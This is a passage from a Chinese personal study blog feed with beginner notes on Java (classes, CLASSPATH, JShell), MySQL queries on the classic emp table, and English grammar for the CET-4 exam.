<pre><code>本程序虽然核心的组成结构为简单java类，但是这里面却有了一些程序的处理逻辑存在，所以这种情况下，依然要按照简单java类组成原则进行定义，而对于一些逻辑的处理操作方法额外追加即可。</code></pre><h3 id="用户登录逻辑"><a href="#用户登录逻辑" class="headerlink" title="用户登录逻辑"></a>用户登录逻辑</h3><p>  <strong>习题要求：设计一个表示用户的User类，类中的变量有用户名、口令、定义类的3个构造方法（无参、为用户名赋值、为用户名和口令赋值）、获取和设置口令的方法和返回类信息的方法,同时编写一个进行登录验证的处理操作逻辑。</strong></p>
<p><em>题目分析：对于当前的程序逻辑定义类的母的是为了进行用户登录，如果说没有用户登录的验证需求，那么这个时候就是一个纯粹的简单java类，但是发现有了用户登录验证的需求之后，对于当前的程序逻辑就不再是一个简单的存储了。</em></p>
<p><strong>范例：实现用户的登录验证</strong></p>
<pre><code>class User
{
    private String name ;
    private String password;
    public User(){
        this(null,null);
    }
    public User(String name){
        this(name, null);
    }
    public User(String name, String password){
        this.name = name ;
        this.password = password;
    }
    public boolean isLogin(String tempName, String tempPassword) {
        return tempName.equals(this.name) &amp;&amp; tempPassword.equals(this.password);
    }
}
public class DongJun //主类
{
    public static void main(String avgs[]){
        User user = new User(&quot;董俊&quot;,&quot;123&quot;);
        if (user.isLogin(&quot;董俊&quot;,&quot;123&quot;))
        {
            System.out.println(&quot;用户登录成功，可以开始进行程序访问！&quot;);
        } else {
                    System.out.println(&quot;用户登录失败，错误的用户名和密码！&quot;);
        }
    }
}</code></pre><blockquote>
<p>用户登录成功，可以开始进行程序访问！</p>
</blockquote>
<pre><code>此时程序类是一个功能性的操作类，他不再是一个简单java类，因为让其存储的是核心的业务处理逻辑。</code></pre>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>知识拓展</tag>
      </tags>
  </entry>
  <entry>
    <title>CLASSPATH环境属性</title>
    <url>/2020/09/19/CLASSPATH%E7%8E%AF%E5%A2%83%E5%B1%9E%E6%80%A7/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="ClassPath环境属性"><a href="#ClassPath环境属性" class="headerlink" title="ClassPath环境属性"></a>ClassPath环境属性</h2><p>所有的java程序在进行执行的时候一般都需要经过两个过程：、</p>
<p>​    Java程序编译过程：是要得到字节码文件，而字节码就是程序执行的主要的二进制文件；</p>
<p>​    java解释执行过程：是在虚拟机上进行解释。</p>
<p>实际上在真个java编译和运行的过程之中都存在有一个非常重要的环境属性“classpath”，利用classpath可以设置第三方程序的加载路径，同时也可以改变java解释的的时候后程序的执行路径。</p>
<p>​    java之所以可以持续的发展，最主要的原因在于，java里面有大量的第三方程序支持，那么既然要有很多的第三方程序支持，就一定需要提供有一种标准的机制来方便的引用这些第三方组件包（是为了进行程序的编译处理）。</p>
<p>​    ClassPath还可以进行程序加载路径的变更，每当使用java命令进行程序执行的时候后，实际上都会牵扯到一个类的加载路径，每一台java虚拟机在默认的情况下都会在当前目录下进行程序类的加载。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">D:\yootk&gt;javac Hello.java</span><br><span class="line"></span><br><span class="line">D:\yootk&gt;java Hello</span><br><span class="line">Hello world!</span><br></pre></td></tr></table></figure></div>

<p>若将盘符切到了C盘</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">C:\Users\23242&gt;java Hello</span><br><span class="line">错误: 找不到或无法加载主类 Hello（提示文字）</span><br><span class="line">原因: java.lang.ClassNotFoundException: Hello</span><br></pre></td></tr></table></figure></div>

<p>此时的路径下并没有提供hello.class文件此时会出现如上的错误提示：</p>
<blockquote>
<p><strong>ClassNotFoundException: Hello</strong></p>
</blockquote>
<p>​    如果说现在要想执行它，那么最简单的做法是直接设置一个类的加载路径，就直接告诉JVM，每一次进行类加载的时候你需要通过我设置的路径来进行“*.class”文件的加载（如果没有告诉JVM这个问题，则JVM会在当前所在的路径下进行加载）。</p>
<p><strong>范例：设置CLASSPATH</strong></p>
<p>设置命令：SET CLASSPATH=类加载路径</p>
<p>设置CLASSPATH： D:\yootk</p>
<p>CLASSPATH是一个系统的环境属性，在Windows系统里面，所有的环境属性都是通过”SET”命令实现的定义；</p>
<blockquote>
<p><strong>C:\Users\23242&gt;set classpath=D:\yootk</strong></p>
<p><strong>C:\Users\23242&gt;java Hello</strong><br><strong>Hello world!</strong></p>
</blockquote>
<p>此时就可以直接执行。</p>
<p>还原成默认形式</p>
<blockquote>
<p>SET classpath=.</p>
</blockquote>
<blockquote>
<p>D:\yootk&gt;java Hello<br>Hello world!</p>
</blockquote>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>知识拓展</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA代码集合</title>
    <url>/2020/09/19/JAVA%E4%BB%A3%E7%A0%81%E9%9B%86%E5%90%88/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="JAVA代码集合"><a href="#JAVA代码集合" class="headerlink" title="JAVA代码集合"></a>JAVA代码集合</h1><p>1、</p>
<pre><code>public class Hello{
    public static void main(String args[]){
        System.out.println(&quot;Hello world!&quot;);
    }
}</code></pre><p>2、        </p>
<pre><code>public class DongJun{ 
    public static void main(String DongJun[]){
        //10是一个数字，既然已经定义好了10，那么就意味着这个内容无法修改了
        System.out.println(10); //常量
    }
}</code></pre><p>3、</p>
<pre><code>public class DongJun{ 
    public static void main(String DongJun[]){
        //所有程序语言最后一定要使用;作为结尾
        int age = 10;//定义一个整型变量，并且设置了默认值
        System.out.println(age); //输出变量内容
        age = 19; //赋值
        System.out.println(age); //输出变量内容
    }
}</code></pre><p>4、</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>知识拓展</tag>
      </tags>
  </entry>
  <entry>
    <title>JShell交互式工具</title>
    <url>/2020/09/18/JShell%E4%BA%A4%E4%BA%92%E5%BC%8F%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Jshell交互式工具"><a href="#Jshell交互式工具" class="headerlink" title="Jshell交互式工具"></a>Jshell交互式工具</h1><p>​    在Java的历史版本之中，实际上从来都没有过这种交互式工具的出现，但那是现在很多的开发语言里面都有交互式编程环境，这样可以便于程序的执行以及程序的简化操作，所以很多的新手是非常喜欢这种交互式编程模型的，于是在JDK 1.9（为什么JDK 1.8没有jshell命令？）之后，开发者只要配置好了JDK的PATH环境属性，那么就可以直接在命令行下面通过“jshell”命令启动交互式编程环境。</p>
<p><img src="https://img-blog.csdnimg.cn/20200921090545192.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1OTM4NjIx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>这种交互式的编程环境，仅仅是对一些开发的操作支持有了改善，但是从整体的角度来讲，于实际的项目开发还是由着非常大的茶杯，作为一个游戏的编程应用是非常不错的，但是如果要作为实际的开发，那么就太痛苦了，针对于JShell仅仅是简化了一些程序结构，那么如果有需要也可以将一些程序的代码直接定义在一些文本文件里面，现在“d:\yootk\yootknam.stat”.</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">System.out.println(&quot;Hello world!&quot;);</span><br><span class="line">System.out.println(&quot;技术学生：董先生&quot;);</span><br></pre></td></tr></table></figure></div>

<p>那么随后肯定是希望可以在jshell环境下main去加载这些文件中的代码，那么就可以通过一个”/open”的命令完成：</p>
<p><img src="https://img-blog.csdnimg.cn/20200921091153411.png#pic_center" alt="在这里插入图片描述"></p>
<p><strong>Jshell输入程序文件代码加载</strong></p>
<h1 id="JShell的退出"><a href="#JShell的退出" class="headerlink" title="JShell的退出"></a>JShell的退出</h1><p>如果已经打开了jshell交互式编程环境，并且突然后悔了，不想继续使用了那么此时你可以直接关闭窗口，或者输入退出命令“/exit”。</p>
<p><img src="https://img-blog.csdnimg.cn/20200921091407674.png#pic_center" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>知识拓展</tag>
      </tags>
  </entry>
  <entry>
    <title>MySql数据库</title>
    <url>/2020/09/16/MySql%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="表的结构"><a href="#表的结构" class="headerlink" title="表的结构"></a>表的结构</h1><blockquote>
<p>+——————-+<br>| Tables_in_dongjun |<br>+——————-+<br>| dept              |   （部门表）<br>| emp               |   （员工表）<br>| salgrade          |   （工资等级表）</p>
</blockquote>
<blockquote>
<p>表的结构mysql&gt; desc dept;<br>+——–+————-+——+—–+———+——-+<br>| Field  | Type        | Null | Key | Default | Extra |<br>+——–+————-+——+—–+———+——-+<br>| DEPTNO | int(2)      | NO   | PRI | NULL    |       |<br>| DNAME  | varchar(14) | YES  |     | NULL    |       |<br>| LOC    | varchar(13) | YES  |     | NULL    |       |<br>+——–+————-+——+—–+———+——-+</p>
</blockquote>
<p>表中的数据</p>
<blockquote>
<p>mysql&gt; select * from emp;<br>+——-+——–+———–+——+————+———+———+——–+<br>| EMPNO | ENAME  | JOB       | MGR  | HIREDATE   | SAL     | COMM    | DEPTNO |<br>+——-+——–+———–+——+————+———+———+——–+<br>|  7369 | SMITH  | CLERK     | 7902 | 1980-12-17 |  800.00 |    NULL |     20 |<br>|  7499 | ALLEN  | SALESMAN  | 7698 | 1981-02-20 | 1600.00 |  300.00 |     30 |<br>|  7521 | WARD   | SALESMAN  | 7698 | 1981-02-22 | 1250.00 |  500.00 |     30 |<br>|  7566 | JONES  | MANAGER   | 7839 | 1981-04-02 | 2975.00 |    NULL |     20 |<br>|  7654 | MARTIN | SALESMAN  | 7698 | 1981-09-28 | 1250.00 | 1400.00 |     30 |<br>|  7698 | BLAKE  | MANAGER   | 7839 | 1981-05-01 | 2850.00 |    NULL |     30 |<br>|  7782 | CLARK  | MANAGER   | 7839 | 1981-06-09 | 2450.00 |    NULL |     10 |<br>|  7788 | SCOTT  | ANALYST   | 7566 | 1987-04-19 | 3000.00 |    NULL |     20 |<br>|  7839 | KING   | PRESIDENT | NULL | 1981-11-17 | 5000.00 |    NULL |     10 |<br>|  7844 | TURNER | SALESMAN  | 7698 | 1981-09-08 | 1500.00 |    0.00 |     30 |<br>|  7876 | ADAMS  | CLERK     | 7788 | 1987-05-23 | 1100.00 |    NULL |     20 |<br>|  7900 | JAMES  | CLERK     | 7698 | 1981-12-03 |  950.00 |    NULL |     30 |<br>|  7902 | FORD   | ANALYST   | 7566 | 1981-12-03 | 3000.00 |    NULL |     20 |<br>|  7934 | MILLER | CLERK     | 7782 | 1982-01-23 | 1300.00 |    NULL |     10 |<br>+——-+——–+———–+——+————+———+———+——–+</p>
</blockquote>
<h1 id="条件查询"><a href="#条件查询" class="headerlink" title="条件查询"></a>条件查询</h1><p>（略）</p>
<h1 id="排序（升序、降序）"><a href="#排序（升序、降序）" class="headerlink" title="排序（升序、降序）"></a>排序（升序、降序）</h1><p>题目：按照工资升序排序，找出员工名和薪资。<br>select ename, sal from emp order by sal;</p>
<blockquote>
<p>+——–+———+<br>| ename  | sal     |<br>+——–+———+<br>| SMITH  |  800.00 |<br>| JAMES  |  950.00 |<br>| ADAMS  | 1100.00 |<br>| WARD   | 1250.00 |<br>| MARTIN | 1250.00 |<br>| MILLER | 1300.00 |<br>| TURNER | 1500.00 |<br>| ALLEN  | 1600.00 |<br>| CLARK  | 2450.00 |<br>| BLAKE  | 2850.00 |<br>| JONES  | 2975.00 |<br>| SCOTT  | 3000.00 |<br>| FORD   | 3000.00 |<br>| KING   | 5000.00 |</p>
</blockquote>
<p><strong>注意：默认是升序asc表示升序、desc表示降序</strong>  </p>
<p>select ename, sal from emp order by sal;<br>select ename, sal from emp order by sal asc; 指定升序<br>select ename, sal from emp order by sal desc; 指定降序</p>
<p>题目：按照工资的降序排列，当工资相同的时候再按照名字的升序排列。</p>
<p>select ename,sal from emp order by sal desc , ename asc;</p>
<blockquote>
<p>+——–+———+<br>| ename  | sal     |<br>+——–+———+<br>| KING   | 5000.00 |<br>| FORD   | 3000.00 |<br>| SCOTT  | 3000.00 |<br>| JONES  | 2975.00 |<br>| BLAKE  | 2850.00 |<br>| CLARK  | 2450.00 |<br>| ALLEN  | 1600.00 |<br>| TURNER | 1500.00 |<br>| MILLER | 1300.00 |<br>| MARTIN | 1250.00 |<br>| WARD   | 1250.00 |<br>| ADAMS  | 1100.00 |<br>| JAMES  |  950.00 |<br>| SMITH  |  800.00 |<br>+——–+———+</p>
</blockquote>
<p><strong>注意</strong>：越靠前的字段越能起到主导作用。只有当前面的字段无法完成排序的时候后，才会启用后面的字段。</p>
<p>select ename, sal from emp order by 2;</p>
<blockquote>
<p>+——–+———+<br>| ename  | sal     |<br>+——–+———+<br>| SMITH  |  800.00 |<br>| JAMES  |  950.00 |<br>| ADAMS  | 1100.00 |<br>| WARD   | 1250.00 |<br>| MARTIN | 1250.00 |<br>| MILLER | 1300.00 |<br>| TURNER | 1500.00 |<br>| ALLEN  | 1600.00 |<br>| CLARK  | 2450.00 |<br>| BLAKE  | 2850.00 |<br>| JONES  | 2975.00 |<br>| SCOTT  | 3000.00 |<br>| FORD   | 3000.00 |<br>| KING   | 5000.00 |<br>+——–+———+</p>
<p><strong>注意：</strong>“2”代表的是第几列。</p>
<p><strong>select * from emp order by 6;</strong></p>
<p>+——-+——–+———–+——+————+———+———+——–+<br>| EMPNO | ENAME  | JOB       | MGR  | HIREDATE   | SAL     | COMM    | DEPTNO |<br>+——-+——–+———–+——+————+———+———+——–+<br>|  7369 | SMITH  | CLERK     | 7902 | 1980-12-17 |  800.00 |    NULL |     20 |<br>|  7900 | JAMES  | CLERK     | 7698 | 1981-12-03 |  950.00 |    NULL |     30 |<br>|  7876 | ADAMS  | CLERK     | 7788 | 1987-05-23 | 1100.00 |    NULL |     20 |<br>|  7521 | WARD   | SALESMAN  | 7698 | 1981-02-22 | 1250.00 |  500.00 |     30 |<br>|  7654 | MARTIN | SALESMAN  | 7698 | 1981-09-28 | 1250.00 | 1400.00 |     30 |<br>|  7934 | MILLER | CLERK     | 7782 | 1982-01-23 | 1300.00 |    NULL |     10 |<br>|  7844 | TURNER | SALESMAN  | 7698 | 1981-09-08 | 1500.00 |    0.00 |     30 |<br>|  7499 | ALLEN  | SALESMAN  | 7698 | 1981-02-20 | 1600.00 |  300.00 |     30 |<br>|  7782 | CLARK  | MANAGER   | 7839 | 1981-06-09 | 2450.00 |    NULL |     10 |<br>|  7698 | BLAKE  | MANAGER   | 7839 | 1981-05-01 | 2850.00 |    NULL |     30 |<br>|  7566 | JONES  | MANAGER   | 7839 | 1981-04-02 | 2975.00 |    NULL |     20 |<br>|  7788 | SCOTT  | ANALYST   | 7566 | 1987-04-19 | 3000.00 |    NULL |     20 |<br>|  7902 | FORD   | ANALYST   | 7566 | 1981-12-03 | 3000.00 |    NULL |     20 |<br>|  7839 | KING   | PRESIDENT | NULL | 1981-11-17 | 5000.00 |    NULL |     10 |<br>+——-+——–+———–+——+————+———+———+——–+</p>
</blockquote>
<p><strong>建议写成</strong></p>
<p><strong>select * from emp order by sal;</strong></p>
<p>题目：找出工作岗位是salesman的员工，并且要求按照薪资的降序排列。</p>
<p><strong>select ename, sal, job from emp where job = ‘salesman’ order by sal desc;</strong></p>
<blockquote>
<p>+——–+———+———-+<br>| ename  | sal     | job      |<br>+——–+———+———-+<br>| ALLEN  | 1600.00 | SALESMAN |<br>| TURNER | 1500.00 | SALESMAN |<br>| WARD   | 1250.00 | SALESMAN |<br>| MARTIN | 1250.00 | SALESMAN |</p>
</blockquote>
<p><strong>语句格式与执行顺序</strong></p>
<blockquote>
<p>select</p>
<p>​    *     3</p>
<p>from  </p>
<p>​    tablename     1</p>
<p>where</p>
<p>​    条件      2</p>
<p>order by      4</p>
<p>​    ……</p>
</blockquote>
<p>order by 是最后执行的</p>
<p><strong>select ename,sal as salary from emp order by salary;</strong></p>
<blockquote>
<p>+——–+———+<br>| ename  | salary  |<br>+——–+———+<br>| SMITH  |  800.00 |<br>| JAMES  |  950.00 |<br>| ADAMS  | 1100.00 |<br>| WARD   | 1250.00 |<br>| MARTIN | 1250.00 |<br>| MILLER | 1300.00 |<br>| TURNER | 1500.00 |<br>| ALLEN  | 1600.00 |<br>| CLARK  | 2450.00 |<br>| BLAKE  | 2850.00 |<br>| JONES  | 2975.00 |<br>| SCOTT  | 3000.00 |<br>| FORD   | 3000.00 |<br>| KING   | 5000.00 |<br>+——–+———+</p>
</blockquote>
<h1 id="分组函数"><a href="#分组函数" class="headerlink" title="分组函数"></a><strong>分组函数</strong></h1><p>count 计数<br>sum 求和<br>avg 平均值<br>max 最大值<br>min 最小值</p>
<p>记住：所有分组的函数都是对“某一组”数据进行操作的。</p>
<p>题目：找出员工工资总和</p>
<p>select sum(sal) sal from emp;<br>select max(sal) sal from emp;<br>select min(sal) sal from emp;<br>select avg(sal) sal from emp;<br>select count(ename) ename from emp;</p>
<blockquote>
<p>+———+<br>| sal     |<br>+———+<br>| 5000.00 |<br>+———+<br>1 row in set (0.01 sec)</p>
<p>+——–+<br>| sal    |<br>+——–+<br>| 800.00 |<br>+——–+<br>1 row in set (0.00 sec)</p>
<p>+————-+<br>| sal         |<br>+————-+<br>| 2073.214286 |<br>+————-+<br>1 row in set (0.00 sec)</p>
<p>+——-+<br>| ename |<br>+——-+<br>|    14 |<br>+——-+</p>
</blockquote>
<p>分组函数一共五个，还有另一个名字：多行处理函数。<br>多行处理函数的特点：输入多行，最终输出的结果是一行。</p>
<p>分组函数自动忽略NULL。<br>select count(comm) from emp;</p>
<blockquote>
<p>+————-+<br>| count(comm) |<br>+————-+<br>|           4 |<br>+————-+</p>
</blockquote>
<h1 id="单行处理函数"><a href="#单行处理函数" class="headerlink" title="单行处理函数"></a>单行处理函数</h1><p><strong>输入一行，输出一行</strong></p>
<p>计算每个员工的年薪？<br>select ename, (sal+comm) * 12 as yearsal from emp;<br>重点：所有数据库明文规定只要有NULL参与运算的运算结果一定是NULL</p>
<p><strong>ifnull()</strong>空处理函数？<br>    ifnull(可能为NULL的数据，被当做什么处理)</p>
<p>select ename, (sal+(ifnull(comm,0))) * 12 as yearsal from emp;</p>
<blockquote>
<p>+——–+———-+<br>| ename  | yearsal  |<br>+——–+———-+<br>| SMITH  |  9600.00 |<br>| ALLEN  | 22800.00 |<br>| WARD   | 21000.00 |<br>| JONES  | 35700.00 |<br>| MARTIN | 31800.00 |<br>| BLAKE  | 34200.00 |<br>| CLARK  | 29400.00 |<br>| SCOTT  | 36000.00 |<br>| KING   | 60000.00 |<br>| TURNER | 18000.00 |<br>| ADAMS  | 13200.00 |<br>| JAMES  | 11400.00 |<br>| FORD   | 36000.00 |<br>| MILLER | 15600.00 |<br>+——–+———-+</p>
</blockquote>
<p>题目：找出工资高于平均工资的员工。</p>
<p>select ename, sal from emp where sal &gt; avg(sal);</p>
<p>报错：ERROR 1111 (HY000): Invalid use of group function</p>
<p>select avg(sal) from emp;</p>
<p>+————-+<br>| avg(sal)    |<br>+————-+<br>| 2073.214286 |<br>+————-+</p>
<p>SQL语法当中有一个语法规则，分组函数不可直接使用在where子句当中。</p>
<p> count(*)和count(具体的某个字段)，他们有什么区别？</p>
<p>​    count(*)：不是统计某个字段中数据的个数，而是统计总记录条数</p>
<p>​    count(comm)：表示统计comm字段中不为NULL的数据总数量。</p>
<p>select count(*) from emp;</p>
<p>select count(comm) from emp;</p>
]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>知识拓展</tag>
      </tags>
  </entry>
  <entry>
    <title>简单句的补充</title>
    <url>/2020/09/02/%E7%AE%80%E5%8D%95%E5%8F%A5%E7%9A%84%E8%A1%A5%E5%85%85/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="介词短语-介词-prep"><a href="#介词短语-介词-prep" class="headerlink" title="介词短语 -  介词  prep."></a><strong>介词短语 -  介词  prep.</strong></h1><blockquote>
<p><strong>时间</strong></p>
<p><strong>before      after</strong> </p>
<p><strong>since     until</strong></p>
<p><strong>during</strong></p>
<p><strong>位置</strong></p>
<p><strong>between（二者之间） among（三者及以上）</strong></p>
<p><strong>地点方位</strong></p>
<p><strong>across(横穿)     through(隧道)</strong></p>
<p><strong>against</strong></p>
<p><strong>like as</strong></p>
</blockquote>
<h1 id="非谓语动词"><a href="#非谓语动词" class="headerlink" title="非谓语动词"></a><u>非谓语动词</u></h1><ol>
<li><p><strong>doing（主动）</strong><br>Passing planes can be heard night and day.</p>
<p>The teacher came into the  classroom, holding a book in his hand.</p>
</li>
<li><p><strong>done（被动）</strong><br>He bought a used car.</p>
<p>The teacher came into the classroom, followed by five students.</p>
</li>
<li><p><strong>to do（目的）</strong><br>I am coming to see you.</p>
<p>I have a lot of homework to do.</p>
</li>
</ol>
<h1 id="同位语-插入语"><a href="#同位语-插入语" class="headerlink" title="同位语/插入语"></a>同位语/插入语</h1><p>My teacher, Mr.Lee, is coming to the meeting.</p>
<p>My teacher  together with his  colleagues is coming to the meeting.</p>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>英语四级</tag>
      </tags>
  </entry>
  <entry>
    <title>状语从句</title>
    <url>/2020/09/02/%E7%8A%B6%E8%AF%AD%E4%BB%8E%E5%8F%A5/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="状语从句"><a href="#状语从句" class="headerlink" title="状语从句"></a>状语从句</h1><h2 id="状语从句含义"><a href="#状语从句含义" class="headerlink" title="状语从句含义"></a><strong>状语从句含义</strong></h2><p><strong>含义</strong>一个句子作状语，表达描述性的信息。</p>
<h2 id="状语从句写法"><a href="#状语从句写法" class="headerlink" title="状语从句写法"></a>状语从句写法</h2><p>一个完整的陈述句，前面加上<strong>从属连词</strong>（不作句子成分，他会表达逻辑关系，说清楚整个句子描述什么的）。</p>
<p>状语从句共分为9种，主要由<strong>从属连词</strong>来决定。</p>
<table>
<thead>
<tr>
<th></th>
<th>从属连词</th>
</tr>
</thead>
<tbody><tr>
<td>时间状语从句</td>
<td>when，while，as，（当……时候）<br />before，after，since，until<br />as soon as，no sooner……than（一……就）</td>
</tr>
<tr>
<td>地点状语从句</td>
<td>where</td>
</tr>
<tr>
<td>原因状语从句</td>
<td>because，since，as</td>
</tr>
<tr>
<td>结果状语从句</td>
<td>so/such…… that（太……所以）, so that…… （所以）</td>
</tr>
<tr>
<td>目的状语从句</td>
<td>so that……， in order that……</td>
</tr>
<tr>
<td>条件状语从句</td>
<td>if，unless，as long as</td>
</tr>
<tr>
<td>让步状语从句</td>
<td>although，though，even though，as</td>
</tr>
<tr>
<td>比较状语从句</td>
<td>than，as</td>
</tr>
<tr>
<td>方式状语从句</td>
<td>as</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>英语四级</tag>
      </tags>
  </entry>
  <entry>
    <title>定语从句</title>
    <url>/2020/09/02/%E5%AE%9A%E8%AF%AD%E4%BB%8E%E5%8F%A5/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="复合句"><a href="#复合句" class="headerlink" title="复合句"></a>复合句</h1><p><strong>定语从句</strong></p>
<p>写法</p>
<p>先行词 =  ？ 关系词 =  ？<br>物   ——　which/that</p>
<p>人   ——    who/whom/that</p>
<p>人的/物的    ——　whose</p>
<p>时间     ——      when</p>
<p>地点    ——      where</p>
<p>原因    ——    why</p>
<p><strong>注意：</strong></p>
<ul>
<li>定语从句每一个关系词都作成分</li>
<li>which和that没有区别，可以互换</li>
<li>whom指人作宾语</li>
<li>who/that指人作任何成分</li>
<li>定语从句中关系词作宾语可以省略</li>
</ul>
<p>I lost the book which/that I borrowed from the library. </p>
<p>The woman I saw in the park was feeding pigeons.</p>
<p>The bus I take to school everyday is usually very crowded.</p>
<p><strong><em>定语从句分类</em></strong></p>
<p>名词范围不明确需要限定性：<br>I met your friend who is staying in Paris.</p>
<p>名词的范围明确，非限定性：<br>I met your mother,  who is staying in Paris.</p>
<blockquote>
<p>限定性从句<br>1、限定性的定语从句，名词范围不明确<br>2、无逗号隔开<br>3、不能省略</p>
<p>非限定性从句<br>1、名词的范围明确<br>2、有逗号隔开<br>3、可以省略不影响表达意思。<br>4、只能用which不用that<br>5、做宾语只能用whom</p>
</blockquote>
<p>如果关系词位于介词后，介词可以提前，提前就只能使用which.</p>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>英语四级</tag>
      </tags>
  </entry>
  <entry>
    <title>名词性从句</title>
    <url>/2020/09/02/%E5%90%8D%E8%AF%8D%E6%80%A7%E4%BB%8E%E5%8F%A5/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="复合句"><a href="#复合句" class="headerlink" title="复合句"></a>复合句</h1><p><strong>名词性从句</strong></p>
<ul>
<li><p><strong>主语从句</strong></p>
<p> Whether we will go camping depends on the weather.</p>
<p>It depends on the weather whether we will go camping.</p>
</li>
<li><p><strong>宾语从句</strong> （<strong>连接词 + 陈述句</strong>）<br><em>陈述句变宾语从句 You are right.</em><br>I know (that) you are right. (在宾语从句中That不做成分可以省略)</p>
<p><em>特殊疑问句变宾语从句 What will she say?</em><br>I know what she will say.(疑问变陈述句，主谓顺序)</p>
<p><em>一般疑问句变宾语从句 Is he happy?</em><br>I know whether/if he is happy.</p>
</li>
<li><p><strong>表语从句</strong><br>My concern is that people don’t care about others.</p>
<p>The question remains whether people will buy it.</p>
</li>
<li><p><strong>同位语从句</strong>（<strong>解释说明n.</strong>）</p>
<p>I have no doubt that he will help me.</p>
<p>I support the argument that the problem of school buses must be taken seriously.</p>
</li>
</ul>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>英语四级</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA编程起步</title>
    <url>/2020/08/31/JAVA%E7%BC%96%E7%A8%8B%E8%B5%B7%E6%AD%A5/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="具体内容"><a href="#具体内容" class="headerlink" title="具体内容"></a><strong>具体内容</strong></h1><p>​    Java是现在世界上最流行的编程语言，在服务器端的开发上保持着绝对的优势。例如： 你现在需要进行网购，如果要进行网购肯定要有网络服务器的支持，对于服务器代码的开发，首选的就是Java，实际上如果要考虑到编程语言特点的话，Java、C、C++实际上都是有着非常相似的语法结构，经过了多年的论述之后，这种语法结构是比较清晰的。</p>
<h1 id="认识Java"><a href="#认识Java" class="headerlink" title="认识Java"></a>认识Java</h1><p>​    Java是现在流行的语言，其前身就是OAK（橡树），实际上最初的OAK编程语言是为了一个GREEN的项目提供服务的，该项目主要是以Email实现对于家电产品的控制（所谓的“万物互联”，这也是早期物联网雏形），但是遗憾的是OAK并没有成功的获得Green项目，如果按照传统的思维模式，这种没有获得投资的项目基本上都属于废弃的产物了，可是在90年代初是属于互联网的时代，尤其是著名的网景公司，对于浏览器的开发非常的到位，于是就缔造了一个上市的神话。OAK吸收了网景公司的产品的想法，产生了一个Hot Java浏览器，一直到了1995年的时候才正式将OAK更名为JAVA，于是就一直延续到了今天，并且随着计算机硬件和网络发展，Java也在不带你的完善。</p>
<blockquote>
<p>友情提示：对于Java有如下几个核心的问题：</p>
<ul>
<li>​    如果要想判断一门语言的未来是否有持久性，最重要的指标就是在于其是否继续保持着更新，保持着最新的设计理念；</li>
<li>​    OAK实际上是使用C++开发出来的，但是相比较C++来讲结构上更加的清晰，所以：Java也是C++编写的；</li>
</ul>
<p>​    之所以叫OAK主要的原因在于语言的设计师的窗户外面有一颗数（橡树），后来原本是想把Java继续使用OAK，但是由于版权的问题，所以无法继续使用，最终这些开发工程师发现他们天天喝的咖啡味道不错（产自爪哇，于是使用了Java）</p>
